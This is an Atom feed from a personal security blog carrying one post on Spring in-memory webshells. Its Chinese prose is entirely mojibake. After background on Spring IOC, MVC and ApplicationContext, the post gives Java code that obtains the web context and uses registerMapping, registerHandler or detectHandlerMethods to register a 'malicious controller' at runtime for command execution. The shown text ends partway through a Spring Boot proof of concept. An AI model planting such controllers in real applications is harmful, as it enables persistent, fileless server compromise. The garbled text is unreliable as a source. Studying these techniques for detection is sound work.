<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://bloyet.github.io</id>
    <title>Bloyet&apos;s blog</title>
    <updated>2025-07-13T05:20:12.176Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://bloyet.github.io"/>
    <link rel="self" href="https://bloyet.github.io/atom.xml"/>
    <subtitle>åšé‚£ä¸ªäººçš„æˆ˜å£«ï¼Œå’Œä»–ä¸€èµ·å»ç»å†ï¼Œå¤±è´¥!</subtitle>
    <logo>https://bloyet.github.io/images/avatar.png</logo>
    <icon>https://bloyet.github.io/favicon.ico</icon>
    <rights>All rights reserved 2025, Bloyet&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[Springå†…å­˜ğŸ]]></title>
        <id>https://bloyet.github.io/post/spring-nei-cun/</id>
        <link href="https://bloyet.github.io/post/spring-nei-cun/">
        </link>
        <updated>2025-07-11T06:07:39.000Z</updated>
        <content type="html"><![CDATA[<p>åœ¨å­¦ä¹ Springå†…å­˜é©¬ä¹‹å‰ï¼Œä½œè€…æ‰“ç®—å¥½å¥½æ¶è¡¥ä¸€ä¸‹å¼€å‘çš„åŸºæœ¬çŸ¥è¯†ï¼Œä¹Ÿç®—æ˜¯ç»™ä¹‹å‰å·æ‡’çš„è‡ªå·±è¡¥è¯¾å§</p>
<p><a href="https://www.bilibili.com/video/BV12J411M7Sj/?spm_id_from=333.1387.collection.video_card.click&amp;vd_source=efb755bbe6728e721e5cf06c81e4366a">ã€ç‹‚ç¥è¯´Javaã€‘JavaWebå…¥é—¨åˆ°å®æˆ˜_å“”å“©å“”å“©_bilibili</a></p>
<p><a href="https://www.bilibili.com/video/BV1PE411i7CV/?vd_source=efb755bbe6728e721e5cf06c81e4366a">ã€ç‹‚ç¥è¯´Javaã€‘SpringBootæœ€æ–°æ•™ç¨‹IDEAç‰ˆé€šä¿—æ˜“æ‡‚_å“”å“©å“”å“©_bilibili</a></p>
<h1 id="springä»‹ç»">Springä»‹ç»</h1>
<p>Springæ˜¯ä¸€ä¸ªè½»é‡çº§çš„Javaå¼€æºæ¡†æ¶ï¼Œç”¨äºé…ç½®ã€ç®¡ç†å’Œç»´æŠ¤Beanï¼ˆç»„ä»¶ï¼‰çš„ä¸€ç§æ¡†æ¶ï¼Œå…¶æ ¸å¿ƒç†å¿µå°±æ˜¯IOC(Inversion of Control,æ§åˆ¶åè½¬) å’Œ AOP(AspectOrientedProgrammingï¼Œ é¢å‘åˆ‡é¢ç¼–ç¨‹)ã€‚</p>
<p>é‡ç‚¹è®²è§£ä¸€ä¸‹æ ¸å¿ƒå†…å®¹</p>
<h2 id="ioc">IOC</h2>
<p>IOCçš„ä¸­æ–‡ç¿»è¯‘ä¸ºï¼šæ§åˆ¶åè½¬</p>
<p>æ ¸å¿ƒç†å¿µæ˜¯ï¼šæŠŠå¯¹è±¡çš„åˆ›å»ºå’Œç®¡ç†æƒäº¤ç»™æ¡†æ¶ï¼Œè€Œä¸æ˜¯ç¨‹åºå‘˜æ‰‹åŠ¨å»åˆ›å»º</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>ä¸ç”¨IOC</p>
<pre><code class="language-java">UserService userService = new UserServiceImpl(); // ç¨‹åºå‘˜è‡ªå·±newå¯¹è±¡
</code></pre>
<p>ä½¿ç”¨IOC</p>
<p>ä½¿ç”¨è¿™ä¸ªæ³¨è§£ï¼Œæˆ‘ä»¬çš„æ¡†æ¶ä¼šåœ¨è¿è¡Œçš„æ—¶å€™è‡ªåŠ¨è¿›è¡Œåˆ›å»º</p>
<pre><code class="language-java">@Autowired
UserService userService; // äº¤ç»™ Spring å®¹å™¨æ¥æ³¨å…¥ï¼Œä¸ç”¨è‡ªå·±new
</code></pre>
<h2 id="aop">AOP</h2>
<p>AOPï¼ˆAspect-Oriented Programmingï¼‰æ˜¯ä¸€ç§é€šè¿‡é¢„å®šä¹‰çš„åˆ‡ç‚¹ï¼ˆPointcutï¼‰å’Œé€šçŸ¥ï¼ˆAdviceï¼‰å°†æ¨ªåˆ‡å…³æ³¨ç‚¹ï¼ˆCross-Cutting Concernsï¼‰æ¨¡å—åŒ–çš„ç¼–ç¨‹èŒƒå¼ã€‚å®ƒå…è®¸å¼€å‘è€…å°†ä¸ä¸šåŠ¡é€»è¾‘æ— å…³ä½†å¯¹å¤šä¸ªæ¨¡å—éƒ½å¾ˆé‡è¦çš„åŠŸèƒ½ï¼ˆå¦‚æ—¥å¿—è®°å½•ã€äº‹åŠ¡ç®¡ç†ã€å®‰å…¨æ§åˆ¶ç­‰ï¼‰ä»æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä¸­åˆ†ç¦»å‡ºæ¥ï¼Œä»è€Œæé«˜ç³»ç»Ÿçš„æ¨¡å—åŒ–ã€å¯ç»´æŠ¤æ€§å’Œå¯é‡ç”¨æ€§</p>
<p>é€šä¿—ä¸€ç‚¹æ¥è¯´ï¼Œå°±æ˜¯ AOP æ˜¯ä¸€ç§è®©ä½ æŠŠâ€œæ¯ä¸ªåœ°æ–¹éƒ½è¦å†™çš„é‡å¤é€»è¾‘â€ï¼ˆæ¯”å¦‚æ—¥å¿—ã€å®‰å…¨ï¼‰é›†ä¸­å†™ä¸€éï¼Œç„¶åè‡ªåŠ¨ç»‡å…¥æ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­çš„æŠ€æœ¯ã€‚</p>
<h2 id="springmvc">SpringMVC</h2>
<figure data-type="image" tabindex="1"><img src="https://bloyet.github.io/post-images/1752214131469.png" alt="" loading="lazy"></figure>
<p>å®¢æˆ·ç«¯å‘é€Requestï¼ŒDispatcherServlet(ç­‰åŒäºControlleræ§åˆ¶å™¨)ï¼Œæ§åˆ¶å™¨æ¥æ”¶åˆ°è¯·æ±‚ï¼Œæ¥åˆ°HandlerMappingï¼ˆåœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®ï¼‰ï¼ŒHandlerMappingä¼šå¯¹URLè¿›è¡Œè§£æï¼Œå¹¶åˆ¤æ–­å½“å‰URLè¯¥äº¤ç»™å“ªä¸ªControlleræ¥å¤„ç†ï¼Œæ‰¾åˆ°å¯¹åº”çš„Controllerä¹‹åï¼ŒControllerå°±è·ŸServerã€JavaBeanè¿›è¡Œäº¤äº’ï¼Œå¾—åˆ°æŸä¸€ä¸ªå€¼ï¼Œå¹¶è¿”å›ä¸€ä¸ªè§†å›¾ï¼ˆModelAndViewè¿‡ç¨‹ï¼‰ï¼ŒDispathcheré€šè¿‡ViewResolverè§†å›¾è§£æå™¨,æ‰¾åˆ°ModelAndViewå¯¹è±¡æŒ‡å®šçš„è§†å›¾å¯¹è±¡,æœ€åï¼Œè§†å›¾å¯¹è±¡è´Ÿè´£æ¸²æŸ“è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ SpringMVC çš„æ ¸å¿ƒç‚¹å°±æ˜¯ <code>DispatchServlet</code></p>
<h2 id="applicationcontext">ApplicationContext</h2>
<p>Spring æ¡†æ¶ä¸­ï¼Œ<code>BeanFactory</code> æ¥å£æ˜¯ <code>Spring</code> IoCå®¹å™¨ çš„å®é™…ä»£è¡¨è€…</p>
<p>Springå®¹å™¨å°±æ˜¯ApplicationContextï¼Œå®ƒæ˜¯ä¸€ä¸ªæ¥å£ç»§æ‰¿äºBeanFactoryï¼Œæœ‰å¾ˆå¤šå®ç°ç±»ã€‚è·å¾—äº†ApplicationContextçš„å®ä¾‹ï¼Œå°±è·å¾—äº†IoCå®¹å™¨çš„å¼•ç”¨ã€‚æˆ‘ä»¬å¯ä»¥ä»ApplicationContextä¸­å¯ä»¥æ ¹æ®Beançš„IDè·å–Beanã€‚</p>
<figure data-type="image" tabindex="2"><img src="https://bloyet.github.io/post-images/1752214131445.png" alt="" loading="lazy"></figure>
<p>å› æ­¤ï¼Œ<code>org.springframework.context.ApplicationContext</code>æ¥å£ä¹Ÿä»£è¡¨äº† <code>IoCå®¹å™¨</code> ï¼Œå®ƒè´Ÿè´£å®ä¾‹åŒ–ã€å®šä½ã€é…ç½®åº”ç”¨ç¨‹åºä¸­çš„å¯¹è±¡(<code>bean</code>)åŠå»ºç«‹è¿™äº›å¯¹è±¡é—´(<code>beans</code>)çš„ä¾èµ–ã€‚</p>
<p>DispatchServletæ˜¯SpringMVCä¸­çš„å‰ç«¯æ§åˆ¶å™¨ï¼Œå¤„ç†æ‰€æœ‰è¯·æ±‚çš„æ ¸å¿ƒç»„ä»¶ï¼Œè€Œå®ƒåˆ›å»ºçš„æ˜¯ä¸€ä¸ªChild Contextï¼Œæ˜¯ä¸€ä¸ªç‹¬ç«‹çš„IOCå®¹å™¨ï¼ˆwebå±‚ä½¿ç”¨ï¼‰</p>
<p>è¿˜æœ‰ä¸€ä¸ªæ˜¯Root ApplicationContextï¼Œå®ƒæ˜¯å…¨å±€çš„ï¼Œè´£ç®¡ç†é¡¹ç›®ä¸­é Web å±‚çš„ Bean ï¼Œç”± ContextLoaderListener åœ¨é¡¹ç›®å¯åŠ¨æ—¶åˆ›å»ºï¼Œè´Ÿè´£åŠ è½½å’Œç®¡ç†æ‰€æœ‰é Web å±‚ Beanï¼Œ ä¿å­˜åˆ° ServletContext ä¸­ä¾›åç»­å­å®¹å™¨å…±äº«ã€‚</p>
<p>æ‰€æœ‰çš„ child å¯ä»¥å–è®¿é—® Root å®¹å™¨ï¼Œä½†æ˜¯ Root å´ä¸èƒ½å»è®¿é—® Child ä¸­çš„å†…å®¹</p>
<p>å½“ç„¶ æ˜¯æ‰€æœ‰çš„contextï¼ˆä¸ä»…ä»…æ˜¯Rootï¼‰ çš„ä¿¡æ¯éƒ½æ˜¯ä¼šå­˜åœ¨ServletContextä¸­çš„</p>
<h1 id="controllerå‹å†…å­˜é©¬">Controllerå‹å†…å­˜é©¬</h1>
<p>åœ¨ Spring ä¸­ï¼Œå½“æˆ‘ä»¬<strong>é™æ€æ³¨å†Œä¸€ä¸ª Controller</strong> æ—¶ï¼Œç¡®å®ä¼š<strong>æŒ‡å®šä¸€ä¸ªç±»çš„æŸä¸ªæ–¹æ³•</strong>å¤„ç†ç‰¹å®šè·¯ç”±ï¼›å½“è¯·æ±‚åˆ°è¾¾è¿™ä¸ªè·¯ç”±æ—¶ï¼ŒSpring ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•ã€‚è¿™æ˜¯ Spring MVC çš„æ ¸å¿ƒåŠŸèƒ½ä¹‹ä¸€</p>
<p>é‚£ä¹ˆåŠ¨æ€æ³¨å†Œçš„æ—¶å€™ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œåªä¸è¿‡æ˜¯ç”±Springè‡ªåŠ¨å®Œæˆï¼Œå˜æˆäº†æˆ‘ä»¬æ‰‹åŠ¨å»æ³¨å†Œï¼Œå½“æˆ‘ä»¬åŠ¨æ€æ³¨å†Œäº†ä¸€ä¸ªæ¶æ„çš„controllerï¼Œå½“æˆ‘ä»¬è®¿é—®æŒ‡å®šè·¯ç”±çš„æ—¶å€™ï¼Œå°±å¯ä»¥è‡ªåŠ¨è°ƒç”¨æ¶æ„æ–¹æ³•ï¼Œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>é‚£ä¹ˆç°åœ¨å°±æ˜¯æ¥çœ‹æ€ä¹ˆè¿›è¡ŒåŠ¨æ€æ³¨å†Œæ¶æ„çš„controller</p>
<h2 id="æ€è·¯">æ€è·¯ï¼š</h2>
<p>è·å–å½“å‰ä¸Šä¸‹æ–‡</p>
<p>æ³¨å†Œæ¶æ„Controller</p>
<p>é…ç½®è·¯å¾„æ˜ å°„ï¼ˆå…¶å®åœ¨åŠ¨æ€æ³¨å†ŒControllerçš„æ—¶å€™ï¼Œå°±ä¼šè¿›è¡Œæ˜ å°„å™¨çš„é…ç½®ï¼‰</p>
<h2 id="è·å–ä¸Šä¸‹æ–‡">è·å–ä¸Šä¸‹æ–‡</h2>
<p>ä¸€å…±æœ‰å››ç§æ–¹æ³•å¯ä»¥è·å–åˆ°ä¸Šä¸‹æ–‡ï¼š</p>
<h3 id="getcurrentwebapplicationcontext">getCurrentWebApplicationContext</h3>
<pre><code class="language-java">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
</code></pre>
<p><strong>getCurrentWebApplicationContext</strong> è·å¾—çš„æ˜¯ä¸€ä¸ª <strong>XmlWebApplicationContext</strong> å®ä¾‹ç±»å‹çš„ <strong>Root WebApplicationContext</strong></p>
<h3 id="webapplicationcontextutils">WebApplicationContextUtils</h3>
<pre><code class="language-java">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
</code></pre>
<p>é€šè¿‡è¿™ç§æ–¹æ³•è·å¾—çš„ä¹Ÿæ˜¯ä¸€ä¸ª <code>Root WebApplicationContext</code>ã€‚å…¶ä¸­ <code>WebApplicationContextUtils.getWebApplicationContext</code> å‡½æ•°ä¹Ÿå¯ä»¥ç”¨ <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>æ¥æ›¿æ¢ã€‚</p>
<h3 id="requestcontextutils">RequestContextUtils</h3>
<pre><code class="language-java">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
</code></pre>
<p>é€šè¿‡ <code>ServletRequest</code> ç±»çš„å®ä¾‹æ¥è·å¾— <code>Child WebApplicationContext</code>ã€‚</p>
<h3 id="getattribute"><strong>getAttribute</strong></h3>
<pre><code class="language-java">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
</code></pre>
<p>è¿™ç§æ–¹å¼ä¸å‰å‡ ç§çš„æ€è·¯å°±ä¸å¤ªä¸€æ ·äº†ï¼Œå› ä¸ºæ‰€æœ‰çš„Contextåœ¨åˆ›å»ºåï¼Œéƒ½ä¼šè¢«ä½œä¸ºä¸€ä¸ªå±æ€§æ·»åŠ åˆ°äº†ServletContextä¸­ã€‚æ‰€ä»¥é€šè¿‡ç›´æ¥è·å¾—ServletContexté€šè¿‡å±æ€§Contextæ‹¿åˆ° Child WebApplicationContext</p>
<h2 id="æ³¨å†Œæ¶æ„controller">æ³¨å†Œæ¶æ„Controller</h2>
<p>æˆ‘ä»¬è¦æƒ³å¯¹Spring Controller çš„åŠ¨æ€æ³¨å†Œï¼Œå°±æ˜¯å¯¹ RequestMappingHandlerMappingæ³¨å…¥çš„è¿‡ç¨‹ã€‚</p>
<p>RequestMappingHandlerMappingæ˜¯springMVCé‡Œé¢çš„æ ¸å¿ƒBeanï¼ŒspringæŠŠæˆ‘ä»¬çš„controllerè§£ææˆRequestMappingInfoå¯¹è±¡ï¼Œç„¶åå†æ³¨å†Œè¿›RequestMappingHandlerMappingä¸­ï¼Œè¿™æ ·è¯·æ±‚è¿›æ¥ä»¥åå°±å¯ä»¥æ ¹æ®è¯·æ±‚åœ°å€è°ƒç”¨åˆ°Controllerç±»é‡Œé¢äº†ã€‚</p>
<p>RequestMappingHandlerMappingå¯¹è±¡æœ¬èº«æ˜¯springæ¥ç®¡ç†çš„ï¼Œå¯ä»¥é€šè¿‡<strong>ApplicationContext</strong>å–åˆ°ï¼Œæ‰€ä»¥å¹¶ä¸éœ€è¦æˆ‘ä»¬æ–°å»º</p>
<p>è€Œåœ¨SpringMVCæ¡†æ¶ä¸‹ï¼Œä¼šæœ‰ä¸¤ä¸ªApplicationContextï¼Œ</p>
<p>ä¸€ä¸ªæ˜¯Spring IOCçš„ä¸Šä¸‹æ–‡ï¼Œè¿™ä¸ªæ˜¯åœ¨java webæ¡†æ¶çš„Listeneré‡Œé¢é…ç½®ï¼Œå°±æ˜¯æˆ‘ä»¬ç»å¸¸ç”¨çš„web.xmlé‡Œé¢çš„org.springframework.web.context.ContextLoaderListenerï¼Œç”±å®ƒæ¥å®ŒæˆIOCå®¹å™¨çš„åˆå§‹åŒ–å’Œbeanå¯¹è±¡çš„æ³¨å…¥ã€‚</p>
<p>å¦å¤–ä¸€ä¸ªæ˜¯ApplicationContextæ˜¯ç”±<strong>org.springframework.web.servlet.DispatcherServlet</strong>å®Œæˆçš„ï¼Œå…·ä½“æ˜¯åœ¨org.springframework.web.servlet.FrameworkServlet#initWebApplicationContext()è¿™ä¸ªæ–¹æ³•åšçš„ã€‚è€Œè¿™ä¸ªè¿‡ç¨‹é‡Œé¢ä¼šå®ŒæˆRequestMappingHandlerMappingè¿™ä¸ªå¯¹è±¡çš„åˆå§‹åŒ–ã€‚</p>
<p>æ˜ å°„å™¨ï¼š å®ƒè´Ÿè´£ç»´æŠ¤ <strong>URL è·¯å¾„ï¼ˆæˆ–å…¶ä»–æ¡ä»¶ï¼‰åˆ°å¤„ç†å™¨ï¼ˆå¦‚ Controller æ–¹æ³•ï¼‰çš„æ˜ å°„å…³ç³»</strong>ã€‚</p>
<p>Spring 2.5 å¼€å§‹åˆ° Spring 3.1 ä¹‹å‰ä¸€èˆ¬ä½¿ç”¨<br>
<code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>
æ˜ å°„å™¨ ï¼›</p>
<p>Spring 3.1 å¼€å§‹åŠä»¥åä¸€èˆ¬å¼€å§‹ä½¿ç”¨æ–°çš„<br>
<code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code><br>
æ˜ å°„å™¨æ¥æ”¯æŒ@Contollerå’Œ@RequestMappingæ³¨è§£ã€‚</p>
<h3 id="registermapping">registerMapping</h3>
<p>åœ¨Spring 4.0åŠä»¥åï¼Œå¯ä»¥ä½¿ç”¨registerMappingç›´æ¥æ³¨å†ŒrequestMapping</p>
<figure data-type="image" tabindex="3"><img src="https://bloyet.github.io/post-images/1752214131485.png" alt="" loading="lazy"></figure>
<p>åœ¨åˆšåˆšå…¶å®ä¹Ÿè¯´äº† springä¼šæŠŠcontrollerè§£æä¸ºRequestMappingInfoå¯¹è±¡ï¼Œç„¶ååœ¨æ³¨å†Œè¿›RequestMappingHandlerMappingï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨registerMappingæ–¹æ³•ä¸­çš„å‚æ•°ï¼Œä¹Ÿæ˜¯RequestMappingInfoç±» æ‰€ä»¥åœ¨æ³¨å†Œä¹‹å‰æˆ‘ä»¬è¿˜éœ€è¦çœ‹ä¸€ä¸‹RequestMappingInfoç±»</p>
<p>å¯ä»¥çœ‹åˆ° æ„é€ æ–¹æ³•æ˜¯æœ‰éå¸¸å¤šçš„å‚æ•°çš„ï¼Œä½†æ˜¯æœ‰ç”¨çš„å…¶å®å°±ä¸¤ä¸ª ä¸€å…±æ˜¯</p>
<pre><code class="language-java">private RequestMappingInfo(@Nullable String name, @Nullable PathPatternsRequestCondition pathPatternsCondition, @Nullable PatternsRequestCondition patternsCondition, RequestMethodsRequestCondition methodsCondition, ParamsRequestCondition paramsCondition, HeadersRequestCondition headersCondition, ConsumesRequestCondition consumesCondition, ProducesRequestCondition producesCondition, RequestConditionHolder customCondition, BuilderConfiguration options) {
    Assert.isTrue(pathPatternsCondition != null || patternsCondition != null, &quot;Neither PathPatterns nor String patterns condition&quot;);
    this.name = StringUtils.hasText(name) ? name : null;
    this.pathPatternsCondition = pathPatternsCondition;
    this.patternsCondition = patternsCondition;
    this.methodsCondition = methodsCondition;
    this.paramsCondition = paramsCondition;
    this.headersCondition = headersCondition;
    this.consumesCondition = consumesCondition;
    this.producesCondition = producesCondition;
    this.customConditionHolder = customCondition;
    this.options = options;
    this.hashCode = calculateHashCode(this.pathPatternsCondition, this.patternsCondition, this.methodsCondition, this.paramsCondition, this.headersCondition, this.consumesCondition, this.producesCondition, this.customConditionHolder);
}
</code></pre>
<p>ä¸€ä¸ªæ˜¯æŒ‡å®šcontrollerçš„è·¯å¾„ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¯´çš„è·¯ç”±ï¼ˆè®¾ç½®å¥½æ˜ å°„å…³ç³»ï¼‰</p>
<p>å¦å¤–ä¸€ä¸ªæ˜¯æŒ‡å®šè¯·æ±‚æ–¹å¼ï¼Œè®¾ç½®ä¸ºä¸é™åˆ¶å°±å¥½</p>
<p>registerMappingæ–¹æ³•ä¸­çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå…¶å®ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯¹åº”çš„æ¶æ„ç±»  ç¬¬ä¸‰ä¸ªå‚æ•°å°±æ˜¯å¯¹åº”çš„æ¶æ„æ–¹æ³•</p>
<p>å…¶å®å¾ˆå¥½ç†è§£ï¼ŒRequestMappingInfoç±»æŒ‡å®šæˆ‘ä»¬æ¶æ„ç±»çš„æ˜ å°„å…³ç³»ï¼Œä½¿æˆ‘ä»¬è®¿é—®å¯¹åº”çš„è·¯ç”±æ—¶ï¼Œå°±ä¼šå¯¹åº”ä¸€ä¸ªç±»ï¼Œè€Œåœ¨MVCæ¶æ„ä¸­ï¼Œæˆ‘ä»¬è®¿é—®ä¸€ä¸ªè·¯ç”±æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨ä¸€ä¸ªæ–¹æ³•çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªæ–¹æ³•ï¼Œå°±æ˜¯åœ¨è¿™é‡Œè¿›è¡ŒæŒ‡å®šçš„</p>
<pre><code class="language-java">// 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹
RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
// 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡
Method method = æ¶æ„ç±»çš„å­—èŠ‚ç .getDeclaredMethods())[0];
// 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€
PatternsRequestCondition url = new PatternsRequestCondition(&quot;/hahaha&quot;);
// 4. å®šä¹‰å…è®¸è®¿é—® controller çš„ HTTP æ–¹æ³•ï¼ˆGET/POSTï¼‰
RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
// 5. åœ¨å†…å­˜ä¸­åŠ¨æ€æ³¨å†Œ controller
RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
r.registerMapping(info, Class.forName(&quot;æ¶æ„Controller&quot;).newInstance(), method);
</code></pre>
<h3 id="registerhandler">registerHandler</h3>
<p>(ç‰ˆæœ¬å¤è€ï¼Œæš‚ä¸”å°±ä¸å¤ç°äº†ï¼ˆï¼šï¼‰<br>
å‚è€ƒä¸Šé¢çš„ HandlerMapping æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ DefaultAnnotationHandlerMapping æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»org.springframework.web.servlet.handler.AbstractUrlHandlerMapping<br>
åœ¨å…¶registerHandler()æ–¹æ³•ä¸­<br>
<a href="https://yyjccc.github.io/img/3-12/15.png"><img src="https://bloyet.github.io/post-images/1752214131501.png" alt="" loading="lazy"></a><br>
è¯¥æ–¹æ³•æ¥å— urlPathå‚æ•°å’Œ handlerå‚æ•°ï¼Œå¯ä»¥åœ¨ this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º handler å‚æ•°å€¼çš„ bean, å°† url å’Œ controller å®ä¾‹ bean æ³¨å†Œåˆ° handlerMap ä¸­</p>
<pre><code>// 1. åœ¨å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­æ³¨å†Œä¸€ä¸ªåä¸º dynamicController çš„ Webshell controller å®ä¾‹ bean context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;me.landgrey.SSOLogin&quot;).newInstance()); // 2. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— DefaultAnnotationHandlerMapping çš„å®ä¾‹ bean org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping  dh = context.getBean(org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping.class); // 3. åå°„è·å¾— registerHandler Method java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractUrlHandlerMapping.class.getDeclaredMethod(&quot;registerHandler&quot;, String.class, Object.class); m1.setAccessible(true); // 4. å°† dynamicController å’Œ URL æ³¨å†Œåˆ° handlerMap ä¸­ m1.invoke(dh, &quot;/favicon&quot;, &quot;dynamicController&quot;);
</code></pre>
<h3 id="detecthandlermethods">detectHandlerMethods</h3>
<p>å‚è€ƒä¸Šé¢çš„ HandlerMapping æ¥å£ç»§æ‰¿å…³ç³»å›¾ï¼Œé’ˆå¯¹ä½¿ç”¨ RequestMappingHandlerMapping æ˜ å°„å™¨çš„åº”ç”¨ï¼Œå¯ä»¥æ‰¾åˆ°å®ƒç»§æ‰¿çš„é¡¶å±‚ç±»org.springframework.web.servlet.handler.AbstractHandlerMethodMapping<br>
åœ¨å…¶detectHandlerMethods() æ–¹æ³•ä¸­</p>
<pre><code>protected void detectHandlerMethods(Object handler) {    Class&lt;?&gt; handlerType = handler instanceof String ? this.getApplicationContext().getType((String)handler) : handler.getClass();    final Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);    Set&lt;Method&gt; methods = HandlerMethodSelector.selectMethods(userType, new MethodFilter() {        public boolean matches(Method method) {            return AbstractHandlerMethodMapping.this.getMappingForMethod(method, userType) != null;        }    });    Iterator var6 = methods.iterator();    while(var6.hasNext()) {        Method method = (Method)var6.next();        T mapping = this.getMappingForMethod(method, userType);        this.registerHandlerMethod(handler, method, mapping);    } }
</code></pre>
<p>è¯¥æ–¹æ³•ä»…æ¥å—handlerå‚æ•°ï¼ŒåŒæ ·å¯ä»¥åœ¨ this.getApplicationContext() è·å¾—çš„ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­å¯»æ‰¾åå­—ä¸º handler å‚æ•°å€¼çš„ bean, å¹¶æ³¨å†Œ controller çš„å®ä¾‹ bean</p>
<pre><code>context.getBeanFactory().registerSingleton(&quot;dynamicController&quot;, Class.forName(&quot;æ¶æ„Controller&quot;).newInstance()); org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping.class); java.lang.reflect.Method m1 = org.springframework.web.servlet.handler.AbstractHandlerMethodMapping.class.getDeclaredMethod(&quot;detectHandlerMethods&quot;, Object.class); m1.setAccessible(true); m1.invoke(requestMappingHandlerMapping, &quot;dynamicController&quot;);
</code></pre>
<h2 id="poc">POC</h2>
<p>æˆ‘è¿™é‡Œå°±ç”¨springboot 2.5.6ç‰ˆæœ¬è¿›è¡Œå¤ç°äº†</p>
<p>æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼š</p>
<p>å…ˆè·å–å½“å‰çš„ä¸Šä¸‹æ–‡ï¼Œç„¶åè·å–RequestMappingHandlerMapping çš„å®ä¾‹ï¼Œç„¶ååœ¨åå°„è·å–æˆ‘ä»¬å†™å¥½çš„æ¶æ„ç±»çš„æ¶æ„æ–¹æ³•ï¼Œç„¶åè·å–å¹¶ä¸”è®¾ç½®æˆ‘ä»¬æƒ³è¦æŠŠæ¶æ„ç±»æ˜ å°„åˆ°çš„è·¯å¾„ï¼Œå’Œè¯·æ±‚æ–¹æ³•ï¼Œè®¾ç½®åˆ°RequestMappingInfoç±»ä¸­ï¼Œç„¶ååœ¨è°ƒç”¨RequestMappingHandlerMappingä¸­çš„registerMappingæ–¹æ³•ï¼Œå®ŒæˆåŠ¨æ€æ³¨å…¥</p>
<pre><code class="language-java">package org.example.spring.Controller;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import java.io.IOException;
import java.lang.reflect.Method;

@RestController
public class shell_controller {

    @RequestMapping(&quot;/exec&quot;)
    public void Spring_Controller() throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException {

        //è·å–å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒ
        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);

        //æ‰‹åŠ¨æ³¨å†ŒController
        // 1. ä»å½“å‰ä¸Šä¸‹æ–‡ç¯å¢ƒä¸­è·å¾— RequestMappingHandlerMapping çš„å®ä¾‹ bean
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        // 2. é€šè¿‡åå°„è·å¾—è‡ªå®šä¹‰ controller ä¸­å”¯ä¸€çš„ Method å¯¹è±¡
        Method method = Shell.class.getDeclaredMethod(&quot;shell&quot;);
        // 3. å®šä¹‰è®¿é—® controller çš„ URL åœ°å€
        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);
